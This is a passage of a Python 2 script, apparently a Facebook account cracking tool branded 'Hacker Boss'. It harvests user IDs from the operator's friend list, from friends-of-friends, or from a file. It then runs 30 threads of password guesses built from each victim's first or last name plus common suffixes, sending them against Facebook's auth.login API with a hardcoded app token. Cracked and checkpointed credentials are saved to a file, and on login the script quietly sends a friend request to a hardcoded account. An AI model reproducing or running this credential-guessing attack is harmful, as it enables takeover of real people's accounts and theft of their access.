				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://youtu.be/OJb1gO7KMrc  ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		Name = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Hacker boss
        time.sleep(0.05)
	print logo
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker♤Boss\033[1;96m•◈•───────────────•◈•"
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;97m"+Name+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;97m"+id+"\x1b[1;97m              "
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker♤Boss\033[1;96m•◈•───────────────•◈•"
	print "\x1b[1;96m[\x1b[1;93m1\x1b[1;96m]\x1b[1;93m Hack Facebook Account"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Logout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Remove The Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker♤Boss\033[1;96m•◈•───────────────•◈•"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m] \033[1;93mHack  ID Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m] \033[1;93mHack Friends Of Friends List"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m] \033[1;93mFile make Hack"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m] \033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker♤Boss\033[1;96m•◈•───────────────•◈•"
		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker♤Boss\033[1;96m•◈•───────────────•◈•"
		idt = raw_input("\033[1;96m[+] \033[1;37mEnter Friend ID Code \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mFriend Name\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mFriend List  Don't Public!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mSearching ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker♤Boss\033[1;96m•◈•───────────────•◈•"
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile Dont See'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	time.sleep(0.05)
	jalan('\033[1;96m[✺] \033[1;92mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
		time.sleep(0.05)
	print
	print('\x1b[1;96m[!] \033[1;92mStop CTRL+z')
	time.sleep(0.05)
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker♤Boss\033[1;96m•◈•───────────────•◈•"
	print ('\033[1;96m[\033[1;92mO\033[1;93mR\033[1;96m]  \033[1;93m    User ID    \033[1;96m| \033[1;93mPassword \033[1;96m  - \033[1;93m ID Name')
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['last_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['last_name']+'1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name']+'1122'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name']+'1122'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['first_name']+'786786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name']+'786'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
																			cek = open("out/super_cp.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			pass9 = b['first_name']+'12345'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q = json.load(data)
																			if 'access_token' in q:
																				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in q["error_msg"]:
																					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
																					cek = open("out/super_cp.txt", "a")
																					cek.write(user+"|"+pass9+"\n")
																					cek.close()
																					cekpoint.append(user+pass9)
																				else:
																					pass10 = b['last_name']+'12345'
																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q = json.load(data)
																					if 'access_token' in q:
																						print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
																						oks.append(user+pass10)
																					else:
																						if 'www.facebook.com' in q["error_msg"]:
																							print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
																							cek = open("out/super_cp.txt", "a")
																							cek.write(user+"|"+pass10+"\n")
																							cek.close()
																							cekpoint.append(user+pass10)
																						else:
																							pass11 = ('007007')
																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							q = json.load(data)
																							if 'access_token' in q:
																								print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
																								oks.append(user+pass11)
																							else:
																								if 'www.facebook.com' in q["error_msg"]:
																									print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
																									cek = open("out/super_cp.txt", "a")
																									cek.write(user+"|"+pass11+"\n")
																									cek.close()
																									cekpoint.append(user+pass11)
																								else:
																									pass12 = ('100200')
																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									q = json.load(data)
																									if 'access_token' in q:
																										print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
																										oks.append(user+pass12)
																									else:
																										if 'www.facebook.com' in q["error_msg"]:
																											print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
																											cek = open("out/super_cp.txt", "a")
																											cek.write(user+"|"+pass12+"\n")
																											cek.close()
																											cekpoint.append(user+pass12)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m•◈•───────────────•◈•\033[1;92mHacker♤Boss\033[1;96m•◈•───────────────•◈•"
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Complete \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal YES/\x1b[1;93mNO \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	super()

if __name__ == '__main__':
	login()

	